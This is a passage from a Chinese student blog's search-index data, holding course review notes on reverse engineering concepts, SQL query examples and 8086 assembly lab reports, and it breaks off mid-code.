href=\"#（7）总结-3\" class=\"headerlink\" title=\"（7）总结\"></a>（7）总结</h3><p>最后一个实验相对前一个比较简单，主要点为以下两个：</p>\n<ol>\n<li>从5个哲学家变7个，对应的变量和程序块应实现对应增加和关系之间的连接。</li>\n<li>OSTaskCreate这个函数设定的优先级应和后面OSTimeDly函数的参数有对应数学关系。</li>\n</ol>\n<p>细心一点解决以上两个问题即可由5个哲学家变7个就餐。</p>\n<p>在操作系统这门课里面有接触P、V操作，重要的是各个信号量的初值和PV操作的时机选择，并且在一个哲学家得不到另一支筷子时要释放已有的筷子，这样才能不会导致死锁问题。</p>\n","categories":["技术"],"tags":["嵌入式"]},{"title":"软件逆向工程复习整理","url":"https://littleghost2016.github.io/2017/11/30/软件逆向工程复习整理/","content":"<p>大三上学期《软件逆向工程》考前整理。<em>现在看好像都忘得差不多了…</em></p>\n<h1 id=\"第一章-前言\"><a href=\"#第一章-前言\" class=\"headerlink\" title=\"第一章-前言\"></a>第一章-前言</h1><ol>\n<li><p>逆向工程的应用：</p>\n<ul>\n<li><p>逆向工程的应用(动态、静态)</p>\n</li>\n<li><p>闭源软件漏洞分析(发现和分析漏洞、开发破解程序(exploit))</p>\n</li>\n<li><p>闭源软件互操作性分析(只能获得二进制程序而想开发与其互操作的软件；依据已有程序，开发适用于其他硬件平台的程序)</p>\n</li>\n<li><p>验证编译器的性能和准确性(验证编译器是否符合规范；寻找优化编译器输出的方法；编译器本身是否有安全问题.</p>\n</li>\n</ul>\n</li>\n<li><p>逆向工程的合法性</p>\n<ul>\n<li><p>以互操作为目的的逆向工程</p>\n</li>\n<li><p>当软件版权所有者无法进行软件错误修正时，通过逆向工程对软件错误进行修正和破解</p>\n</li>\n<li><p>在不违反专利权或商业秘密保护的前提下，通过逆向工程确定软件中不受版权保护的部分(如一些算法)</p>\n</li>\n</ul>\n</li>\n</ol>\n<h1 id=\"第二章-86-x64：\"><a href=\"#第二章-86-x64：\" class=\"headerlink\" title=\"第二章-86_x64：\"></a>第二章-86_x64：</h1><ol>\n<li><p>x86：Intel体系结构的32位实现，基于Intel8086处理器的<em>小端序</em>体系结构</p>\n</li>\n<li><p>三种主要操作模式：</p>\n<ul>\n<li><p>实模式(real)：只支持16位指令集</p>\n</li>\n<li><p>保护模式(protected)：支持虚拟内存、分页等</p>\n</li>\n<li><p>系统管理模式(System Management Mode)：用于执行嵌入在固件中的特殊代码</p>\n</li>\n</ul>\n</li>\n<li><p>小端序(little endian)：低位字节存储在内存中低位地址，效率较高；大端序(RISC架构采用)</p>\n</li>\n<li><p>用户态应用运行于Ring3，内核运行于Ring0。Ring等级在CS寄存器中保存。</p>\n</li>\n<li><p>EFLAGS:</p>\n<ul>\n<li>ZeroF:结果0-&gt;ZF=1</li>\n<li>OverflowF:有符号整数溢出时OF=1</li>\n<li>CarryF:无符号整数溢出时CF=1</li>\n<li>SignF:与最高位相同</li>\n<li>DirectionF：=1则ESI、EDI每次减小</li>\n</ul>\n</li>\n<li><p>Byte-&gt;1 Word-&gt;2 Dword-&gt;4</p>\n</li>\n<li><p>scas-&gt;AL/AX/EAX与[EDI]比较，并对EDI自增/自减，STOS-&gt;AL/AX/EAX的值写入EDI指向的内存</p>\n</li>\n</ol>\n<h1 id=\"第四章-PE结构：\"><a href=\"#第四章-PE结构：\" class=\"headerlink\" title=\"第四章-PE结构：\"></a>第四章-PE结构：</h1><p> 3C-&gt;PE头地址</p>\n<h1 id=\"第五章-Windoes编程\"><a href=\"#第五章-Windoes编程\" class=\"headerlink\" title=\"第五章-Windoes编程\"></a>第五章-Windoes编程</h1><h2 id=\"核心API\"><a href=\"#核心API\" class=\"headerlink\" title=\"核心API\"></a>核心API</h2><ol>\n<li>OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)</li>\n<li>CreateRemoteThread(hProcess, NULL, 0, lpStartAddress, lpParameter, 0, NULL)</li>\n<li>VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE)</li>\n<li>hThread = CreateThread(NULL,0,lpStartAddress,lpParameter,0,＆dwThread)</li>\n<li>WriteProcessMemory(hProcess,lpBaseAddress,lpBuffer,nSize,<em>Out</em> SIZE_T  *lpNumberOfBytesWritten)</li>\n<li>GetProcAddress(hModule-&gt;DLL模块的句柄可由LoadLibrary等返回, lpProcName名或序数)</li>\n<li>WaitForSingleObject(hHandle-必有synchronize权限, dwMilliseconds)</li>\n<li>GetModuleFileName(hModule-被装载模块句柄,NULL则返回当前进程可执行文件路径,<em>Out</em> LPTSTR lpFilename,nSize-大于则截尾)</li>\n<li>GetModuleHandle(lpModuleName-被装载模块(.dll或.exe文件)名称，若省略扩展名则默认为.dll，若为NULL，则返回创建当前进程的.exe的句柄)</li>\n<li>CloseHandle(hObject)</li>\n<li>SetWindowsHookEx(idHook,lpfn-指向(回调函数)的指针,hMod-指向回调函数所在DLL的句柄,dwThreadId-被关联到的线程的ID)</li>\n<li>CallNextHookEx(hhk,nCode-传递到当前钩子过程的钩子代码,wParam,lParam)</li>\n<li>UnhookWindowsHookEx(hhk-被移除钩子的句柄，由前一次调用的SetWindowsHookEx函数返回)</li>\n</ol>\n<h1 id=\"第六章-DLL注入\"><a href=\"#第六章-DLL注入\" class=\"headerlink\" title=\"第六章-DLL注入\"></a>第六章-DLL注入</h1><p>1.注入方法：实现远程线程CreateRemoteThread()、使用注册表AppInit_DLLs值、消息钩取SetWindowsHookEx()</p>\n<h1 id=\"第七章-API钩取\"><a href=\"#第七章-API钩取\" class=\"headerlink\" title=\"第七章-API钩取\"></a>第七章-API钩取</h1><h1 id=\"第八章-混淆技术\"><a href=\"#第八章-混淆技术\" class=\"headerlink\" title=\"第八章-混淆技术\"></a>第八章-混淆技术</h1><ol>\n<li>防篡改技术分为静态和动态，混淆属于静态技术</li>\n<li>基于数据的混淆：常量展开/插入死代码/数据编码方案(f,x-混淆-&gt;f(x0)，解混淆时f(x0)-恢复-&gt;x0)</li>\n<li>等价-x=~x+1，x-1=~(-x)，x+1=-(~x)</li>\n<li>基于控制的混淆：组合使用函数内联与外联/引入无条件分支，破环局部性/插入垃圾代码/基于处理器的控制间接化/不透明谓词</li>\n</ol>\n","categories":["技术"],"tags":["逆向"]},{"title":"数据库原理复习整理","url":"https://littleghost2016.github.io/2017/07/11/数据库原理复习整理/","content":"<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">SCHEMA</span> <span class=\"keyword\">TEST</span> AUTHORIZATION ZHANG;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">SCHEMA</span> &lt;模式名&gt; &lt;<span class=\"keyword\">CASCADE</span> | RESTRICT&gt;;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">TABLE</span>  &lt;表  名&gt; &lt;<span class=\"keyword\">CASCADE</span> | RESTRICT&gt;;     <span class=\"comment\">---缺省是RESTRICT</span></span><br><span class=\"line\">                       级联      限制</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">TABLE</span> SC(</span><br><span class=\"line\">        Sno <span class=\"built_in\">CHAR</span>(<span class=\"number\">5</span>), </span><br><span class=\"line\">        Cno <span class=\"built_in\">CHAR</span>(<span class=\"number\">3</span>), </span><br><span class=\"line\">        Grade <span class=\"built_in\">int</span>,</span><br><span class=\"line\">    　  PRIMARY <span class=\"keyword\">KEY</span> (Sno,Cno),</span><br><span class=\"line\">    　  <span class=\"keyword\">FOREIGN</span> <span class=\"keyword\">KEY</span> (Sno) <span class=\"keyword\">REFERENCES</span> S(Sno),       <span class=\"comment\">--- FOREIGN KEY &lt;列名&gt;REFERENCES &lt;被参照表名&gt;(&lt;列名&gt;)</span></span><br><span class=\"line\">    　  <span class=\"keyword\">FOREIGN</span> <span class=\"keyword\">KEY</span> (Cno) <span class=\"keyword\">REFERENCES</span> C(Cno));</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> &lt;表名&gt;</span><br><span class=\"line\">    [ <span class=\"keyword\">ADD</span> &lt;新列名&gt; &lt;数据类型&gt; [ 完整性约束 ] ]</span><br><span class=\"line\">    [ <span class=\"keyword\">DROP</span> &lt;完整性约束名&gt;]</span><br><span class=\"line\">　　[ <span class=\"keyword\">ALTER</span> <span class=\"keyword\">COLUMN</span> &lt;列名&gt;  &lt;数据类型&gt; ] ;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> Student <span class=\"keyword\">ADD</span> Scome <span class=\"built_in\">DATE</span> ;</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> Student <span class=\"keyword\">Drop</span> Scome ;</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> Student <span class=\"keyword\">ALTER</span> <span class=\"keyword\">COLUMN</span> Sage <span class=\"built_in\">SMALLINT</span> ;</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> Student <span class=\"keyword\">ADD</span> <span class=\"keyword\">UNIQUE</span>(Sname) ;</span><br><span class=\"line\"><span class=\"keyword\">ALTER</span> <span class=\"keyword\">TABLE</span> Student <span class=\"keyword\">DROP</span> <span class=\"keyword\">UNIQUE</span>(Sname) ;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">SC表按学号升序和课程号降序建唯一索引</span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> <span class=\"keyword\">UNIQUE</span> <span class=\"keyword\">INDEX</span> SCno <span class=\"keyword\">ON</span> SC(Sno,Cno <span class=\"keyword\">DESC</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">在Student表的Sname列上建立一个聚簇索引，而且Student表中的记录将按照Sname值的升序存放</span><br><span class=\"line\"><span class=\"keyword\">CREATE</span> CLUSTER <span class=\"keyword\">INDEX</span> Stusname <span class=\"keyword\">ON</span> Student(Sname);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">DROP</span> <span class=\"keyword\">INDEX</span> Stusname; <span class=\"comment\">---SQL标准中没有定义对索引的修改功能，而采用删除后重新定义索引的方式实现</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> <span class=\"keyword\">DISTINCT</span> Sno <span class=\"keyword\">FROM</span> SC; <span class=\"comment\">---DISTINCT取消重复行,作用范围是所有目标列</span></span><br><span class=\"line\">投影(π)运算的定义中直接去掉了结果中的重复元组，SQL中必须明确指定DISTINCT,否则默认ALL</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">-查询年龄不在20～23岁之间的学生姓名、系别和年龄。</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sname,Sdept,Sage <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sage <span class=\"keyword\">NOT</span> <span class=\"keyword\">BETWEEN</span> <span class=\"number\">20</span>  <span class=\"keyword\">AND</span> <span class=\"number\">23</span>;</span><br><span class=\"line\">-查询不是信息系(IS)、数学系(MA)和计算机科学系(CS)学生的姓名和性别。</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sname,Ssex <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sdept <span class=\"keyword\">NOT</span> <span class=\"keyword\">IN</span> (<span class=\"string\">'IS'</span>,<span class=\"string\">'MA'</span>,<span class=\"string\">'CS'</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">%:任意长度(可以为0)的字符串    _:任意单个字符</span><br><span class=\"line\">-查询姓名中第二个字为“阳”字的学生姓名和学号。</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sname,Sno <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sname <span class=\"keyword\">LIKE</span> <span class=\"string\">'__阳％'</span>;</span><br><span class=\"line\">-查询以\"DB_\"开头，倒数第3个字符为i的课程的详细情况。</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> Course <span class=\"keyword\">WHERE</span> Cname <span class=\"keyword\">LIKE</span> <span class=\"string\">'DB\\_%i__'</span> ESCAPE <span class=\"string\">'\\';</span></span><br><span class=\"line\"><span class=\"string\">-查询所有有成绩的学生学号和课程号</span></span><br><span class=\"line\"><span class=\"string\">SELECT Sno,Cno FROM SC WHERE Grade IS NOT NULL;</span></span><br><span class=\"line\"><span class=\"string\">!!!   [NOT] BETWEEN … AND … 和 [NOT] IN将不会利用索引提高查询效率，应改为多重条件查询</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">-所在系的系名升序排列,年龄降序排列</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">ORDER</span> <span class=\"keyword\">BY</span> Sdept,Sage <span class=\"keyword\">DESC</span>;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight\"><table><tr><td class=\"code\"><pre><span class=\"line\">集函数:</span><br><span class=\"line\">COUNT ([DISTINCT|ALL] &lt;列名&gt;) SUM AVG MAX MIN   ---DISTINCT以避免重复</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">查询有3门以上课程是90分以上的学生的学号及(90分以上的)课程数。</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sno, <span class=\"keyword\">COUNT</span>(*) <span class=\"keyword\">FROM</span> SC <span class=\"keyword\">WHERE</span> Grade&gt;<span class=\"number\">90</span> <span class=\"keyword\">GROUP</span> <span class=\"keyword\">BY</span> Sno <span class=\"keyword\">HAVING</span> <span class=\"keyword\">COUNT</span>(*)&gt;<span class=\"number\">3</span>;</span><br></pre></td></tr></table></figure>\n\n<p>WHERE-&gt;GROUP BY-&gt;HAVING-&gt;SELECT</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> Student.Sno,Sname,Ssex,Sage,Sdept,Cno,Grade <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">LEFT</span> <span class=\"keyword\">OUTER</span> <span class=\"keyword\">JOIN</span> SC </span><br><span class=\"line\"><span class=\"keyword\">ON</span> Student.Sno = SC.Sno;    或USING(Sno);</span><br></pre></td></tr></table></figure>\n\n<p>子查询的限制－－不能使用ORDER BY子句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">-查询其他系中比信息系某些学生年龄小的学生姓名和年龄。</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sname,Sage <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sage &lt; <span class=\"keyword\">ANY</span> (<span class=\"keyword\">SELECT</span> Sage <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sdept= <span class=\"string\">'IS'</span>) <span class=\"keyword\">AND</span> Sdept &lt;&gt; <span class=\"string\">'IS'</span>;</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sname,Sage <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sage &lt; (<span class=\"keyword\">SELECT</span> <span class=\"keyword\">MAX</span>(Sage) <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> Sdept= <span class=\"string\">'IS'</span>) <span class=\"keyword\">AND</span> Sdept &lt;&gt; <span class=\"string\">'IS'</span>;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">输出这样的学生，不存在某门课程，在他的选课记录里没有选这门课</span><br><span class=\"line\"><span class=\"keyword\">SELECT</span> Sname <span class=\"keyword\">FROM</span> Student <span class=\"keyword\">WHERE</span> </span><br><span class=\"line\"><span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span> (<span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> Course <span class=\"keyword\">WHERE</span> </span><br><span class=\"line\"><span class=\"keyword\">NOT</span> <span class=\"keyword\">EXISTS</span> (<span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> SC <span class=\"keyword\">WHERE</span> Sno = Student.Sno <span class=\"keyword\">AND</span> Cno = Course.Cno));</span><br></pre></td></tr></table></figure>\n\n","categories":["技术"],"tags":["sql"]},{"title":"微机原理与系统设计上机作业","url":"https://littleghost2016.github.io/2017/05/23/微机原理与系统设计上机作业/","content":"<h1 id=\"实验一-EMU8086使用及指令系统熟悉\"><a href=\"#实验一-EMU8086使用及指令系统熟悉\" class=\"headerlink\" title=\"实验一 EMU8086使用及指令系统熟悉\"></a>实验一 EMU8086使用及指令系统熟悉</h1><h2 id=\"实验要求\"><a href=\"#实验要求\" class=\"headerlink\" title=\"实验要求\"></a>实验要求</h2><ol>\n<li>熟悉并掌握EMU8086 汇编语言调试环境；</li>\n<li>学习8086的指令系统，输入简单的指令，观察各寄存器、内存相关单元以及处理器标志位的变化（数据传送类指令，算数运算类指令，逻辑运算类指令，标志处理和CPU控制类指令，移位和循环移位类指令，处理器控制类指令等，要求每类指令至少一个用例。具体用例自行设计，可参考教材用例）；</li>\n<li>学习汇编语言程序设计的基本步骤和方法；</li>\n<li>学会使用EMU8086 debug调试程序；</li>\n<li>编写一个简单的程序：将“This is my first ASM program-姓名（汉语拼音各人的姓名）”放在DS=1000H，BX=0000H开始的存储器单元中，然后将该内容搬移到BX=0100H开始的单元中，最后将该字符串通过DOS功能调用显示在屏幕上。</li>\n</ol>\n<h2 id=\"实验目的\"><a href=\"#实验目的\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><ol>\n<li>学习EMU8086仿真开发环境的使用，理解和掌握汇编语言编程的基本步骤；</li>\n<li>熟悉8086指令系统；</li>\n<li>熟悉变量、常量及伪指令的使用；</li>\n<li>熟悉内存单元的存储结构，字符串的处理以及简单的编程。</li>\n</ol>\n<h2 id=\"实验内容\"><a href=\"#实验内容\" class=\"headerlink\" title=\"实验内容\"></a>实验内容</h2><h3 id=\"一、书本指令用例调试\"><a href=\"#一、书本指令用例调试\" class=\"headerlink\" title=\"一、书本指令用例调试\"></a>一、书本指令用例调试</h3><p>传送指令：mov（直接寻址）</p>\n<p><img src=\"clip_image002.jpg\" alt=\"img\"></p>\n<p>xchg：交换指令（直接寻址）</p>\n<p><img src=\"clip_image004.jpg\" alt=\"img\"></p>\n<p>地址传送指令：lea</p>\n<p><img src=\"clip_image006.jpg\" alt=\"img\"></p>\n<p>入栈出栈操作：Push/pop</p>\n<p><img src=\"clip_image008.jpg\" alt=\"img\"></p>\n<p>加法操作：add</p>\n<p><img src=\"clip_image010.jpg\" alt=\"img\"></p>\n<p>减法操作：sub</p>\n<p><img src=\"clip_image012.jpg\" alt=\"img\"></p>\n<p>综合程序1</p>\n<p><img src=\"clip_image014.jpg\" alt=\"img\"></p>\n<p>乘法操作：div</p>\n<p><img src=\"clip_image016.jpg\" alt=\"img\"></p>\n<p>and指令</p>\n<p><img src=\"clip_image018.jpg\" alt=\"img\"></p>\n<p>or指令</p>\n<p><img src=\"clip_image020.jpg\" alt=\"img\"></p>\n<p>not指令</p>\n<p><img src=\"clip_image022.jpg\" alt=\"img\"></p>\n<p>异或（xor）指令</p>\n<p><img src=\"clip_image024.jpg\" alt=\"img\"></p>\n<p>移位指令：sal</p>\n<p><img src=\"clip_image026.jpg\" alt=\"img\"></p>\n<p><strong>移位指令：**</strong>sar**</p>\n<p><img src=\"clip_image028.jpg\" alt=\"img\"></p>\n<p>串操作指令：movsb</p>\n<p><img src=\"clip_image030.jpg\" alt=\"img\"></p>\n<p>jmp指令</p>\n<p><img src=\"clip_image032.jpg\" alt=\"img\"></p>\n<p>循环操作指令</p>\n<p><img src=\"clip_image034.jpg\" alt=\"img\"></p>\n<h3 id=\"二、编写一个简单的程序\"><a href=\"#二、编写一个简单的程序\" class=\"headerlink\" title=\"二、编写一个简单的程序\"></a>二、编写一个简单的程序</h3><p>将“This is my first ASM program-姓名（汉语拼音各人的姓名）”放在DS=1000H，BX=0000H开始的存储器单元中，然后将该内容搬移到BX=0100H开始的单元中，最后将该字符串通过DOS功能调用显示在屏幕上。</p>\n<h4 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">name &apos;aa&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">org 00h</span><br><span class=\"line\"></span><br><span class=\"line\">assume cs:code ds:data</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">msg db &apos;T&apos;,7h,&apos;h&apos;,7h,&apos;i&apos;,7h,&apos;s&apos;,7h,&apos; &apos;,7h,&apos;m&apos;,7h,&apos;y&apos;,7h,&apos; &apos;,7h,&apos;f&apos;,7h,&apos;i&apos;,7h,&apos;r&apos;,7h,&apos;s&apos;,7h,&apos;t&apos;,7h,&apos; &apos;,7h,&apos;A&apos;,7h,&apos;S&apos;,7h,&apos;M&apos;,7h,&apos; &apos;,7h,&apos;p&apos;,7h,&apos;r&apos;,7h,&apos;o&apos;,7h,&apos;g&apos;,7h,&apos;r&apos;,7h,&apos;a&apos;,7h,&apos;m&apos;,7h,&apos;-&apos;,7h,&apos;W&apos;,7h,&apos;a&apos;,7h,&apos;n&apos;,7h,&apos;g&apos;,7h,&apos;R&apos;,7h,&apos;u&apos;,7h,&apos;i&apos;,7h</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment </span><br><span class=\"line\"></span><br><span class=\"line\">start: </span><br><span class=\"line\"></span><br><span class=\"line\">  mov ax,1000h</span><br><span class=\"line\">  mov es,ax</span><br><span class=\"line\">  mov ax,data</span><br><span class=\"line\">  mov ds,ax</span><br><span class=\"line\">  mov di,00h</span><br><span class=\"line\">  mov si,00h</span><br><span class=\"line\">  mov cx,72</span><br><span class=\"line\">  rep movsb</span><br><span class=\"line\"></span><br><span class=\"line\">  mov ax,0b800h</span><br><span class=\"line\">  mov es,ax</span><br><span class=\"line\">  mov di,0a00h</span><br><span class=\"line\">  mov si,00h</span><br><span class=\"line\">  mov cx,72</span><br><span class=\"line\">  rep movsb</span><br><span class=\"line\"></span><br><span class=\"line\">  mov ax,1000h</span><br><span class=\"line\">  mov es,ax</span><br><span class=\"line\">  mov si,00h</span><br><span class=\"line\">  mov di,0100h</span><br><span class=\"line\">  mov cx,72</span><br><span class=\"line\">  rep movsb  </span><br><span class=\"line\"></span><br><span class=\"line\">mov ax,4c00h</span><br><span class=\"line\"></span><br><span class=\"line\">int 21h </span><br><span class=\"line\"></span><br><span class=\"line\">code ends </span><br><span class=\"line\"></span><br><span class=\"line\">end start</span><br><span class=\"line\"></span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image036.jpg\" alt=\"img\"></p>\n<p>运用数据段和代码段，先将数据写入1000:0000，往屏幕输出后再将数据搬入1000:0100</p>\n<h3 id=\"三、感受感想\"><a href=\"#三、感受感想\" class=\"headerlink\" title=\"三、感受感想\"></a>三、感受感想</h3><p>本学期新接触微机原理这门课程，刚开始接触汇编，感觉进入了新的领域，对其中的思想和思维方式还没有，在这次上机实验实际操作和作业过程中，巩固了老师上课所讲的要点，也学着用会变得角度去思考问题和设计思路，同时在自己的许多改正中了解了出现的错误所代表的内在性质，进一步加强了自己的理解。不过现在对于一些汇编指令还不够熟悉，需要经常查书，自己也会在基础知识这方面加强，写出更好看更实用的代码。</p>\n<p><em>当时的自己hhhh</em></p>\n<h1 id=\"实验二-顺序、分支、循环、子程序设计\"><a href=\"#实验二-顺序、分支、循环、子程序设计\" class=\"headerlink\" title=\"实验二 顺序、分支、循环、子程序设计\"></a>实验二 顺序、分支、循环、子程序设计</h1><h2 id=\"实验要求-1\"><a href=\"#实验要求-1\" class=\"headerlink\" title=\"实验要求\"></a>实验要求</h2><ol>\n<li>教材P74例1。m=6,n=4,w=7。结果Q也放在内存中。</li>\n<li>教材P75例3。</li>\n<li>从键盘上输入1个数，判断其奇偶性，如果是奇数，屏幕上显示”It is odd”，否则显示”It is even”。</li>\n<li>从键盘上输入N个字符（N&lt;16），求这N个字符中’A’的个数，并将’A’的个数显示在屏幕上。</li>\n<li>已知BUF1中有N1个按从小到大的顺序排列的互不相等的无符号数，BUF2中有N2个从小到大的顺序排列的互不相等的无符号数。编写程序将BUF1和BUF2中的数合并到BUF3中，使在BUF3中存放的数互不相等且按从小到大的顺序排列。</li>\n<li>需要预习报告。</li>\n</ol>\n<h2 id=\"实验目的-1\"><a href=\"#实验目的-1\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><p>学习顺序、分支、循环结构以及子程序的编程设计。</p>\n<h2 id=\"实验内容-1\"><a href=\"#实验内容-1\" class=\"headerlink\" title=\"实验内容\"></a>实验内容</h2><h3 id=\"1-源码\"><a href=\"#1-源码\" class=\"headerlink\" title=\"1.源码\"></a>1.源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">; You may customize this and other start-up templates; </span><br><span class=\"line\">; The location of this template is c:\\emu8086\\inc\\0_com_template.txt</span><br><span class=\"line\"></span><br><span class=\"line\">org 100h</span><br><span class=\"line\"></span><br><span class=\"line\">data db 6,4,7          ;定义数字</span><br><span class=\"line\">xor ax,ax</span><br><span class=\"line\">lea si,data</span><br><span class=\"line\">mov al,[si]            ;储存数字</span><br><span class=\"line\">mov bl,[si+1]</span><br><span class=\"line\">mul bl                 ;乘法运算</span><br><span class=\"line\">sub al,[si+2]          ;加法运算</span><br><span class=\"line\">mov [si+3],ax          ;储存结果</span><br><span class=\"line\"></span><br><span class=\"line\">mov ax,4c00h</span><br><span class=\"line\">int 21h                ;程序结束</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image002-1585749590672.jpg\" alt=\"img\"></p>\n<p>结果依次存放在内存代码段，6,4,7均为需进行运算的数，11为最后结果。</p>\n<h3 id=\"2-源码\"><a href=\"#2-源码\" class=\"headerlink\" title=\"2.源码\"></a>2.源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">; You may customize this and other start-up templates; </span><br><span class=\"line\">; The location of this template is c:\\emu8086\\inc\\0_com_template.txt</span><br><span class=\"line\"></span><br><span class=\"line\">org 100h</span><br><span class=\"line\"></span><br><span class=\"line\">data1 db 40 dup(90)                ;为简便输入，假设前40人90分，后40人59分</span><br><span class=\"line\">data2 db 40 dup(59)</span><br><span class=\"line\">buffer db 4 dup(0)</span><br><span class=\"line\"></span><br><span class=\"line\">start:</span><br><span class=\"line\">    xor dx,dx</span><br><span class=\"line\">    xor bx,bx</span><br><span class=\"line\">    mov cx,80</span><br><span class=\"line\">    lea si,data1</span><br><span class=\"line\">    lea di,buffer</span><br><span class=\"line\">goon:</span><br><span class=\"line\">    mov al,[si]</span><br><span class=\"line\">    cmp al,90</span><br><span class=\"line\">    jc next3</span><br><span class=\"line\">    inc dh</span><br><span class=\"line\">    jmp stor</span><br><span class=\"line\">next3:</span><br><span class=\"line\">    cmp al,70</span><br><span class=\"line\">    jc next5</span><br><span class=\"line\">    inc dl</span><br><span class=\"line\">    jmp stor</span><br><span class=\"line\">next5:</span><br><span class=\"line\">    cmp al,60</span><br><span class=\"line\">    jc next7</span><br><span class=\"line\">    inc bh</span><br><span class=\"line\">    jmp stor</span><br><span class=\"line\">next7:</span><br><span class=\"line\">    inc bl</span><br><span class=\"line\">stor:</span><br><span class=\"line\">    inc si</span><br><span class=\"line\">    loop goon</span><br><span class=\"line\">    mov [di],dh</span><br><span class=\"line\">    mov [di+1&#125;,dl</span><br><span class=\"line\">    mov [di+2],bh</span><br><span class=\"line\">    mov [di+3],bl</span><br><span class=\"line\">mov ax,4c00h</span><br><span class=\"line\">int 21h</span><br><span class=\"line\"></span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"clip_image004-1585749590673.jpg\" alt=\"img\"></p>\n<p>最后在bl、dh、内存中都能找到成绩归类后的计数。</p>\n<h3 id=\"3-源码\"><a href=\"#3-源码\" class=\"headerlink\" title=\"3.源码\"></a>3.源码</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data1 segment</span><br><span class=\"line\">    msgo db &quot;It is odd&quot;,0ah,0dh,&quot;$&quot;</span><br><span class=\"line\">    msge db &quot;It is even&quot;,0ah,0dh,&quot;$&quot;</span><br><span class=\"line\">    num db 20</span><br><span class=\"line\">data1 ends </span><br><span class=\"line\"></span><br><span class=\"line\">code1 segment</span><br><span class=\"line\">    assume cs:coda1 ds:data1</span><br><span class=\"line\">start:</span><br><span class=\"line\">    mov ax,data1</span><br><span 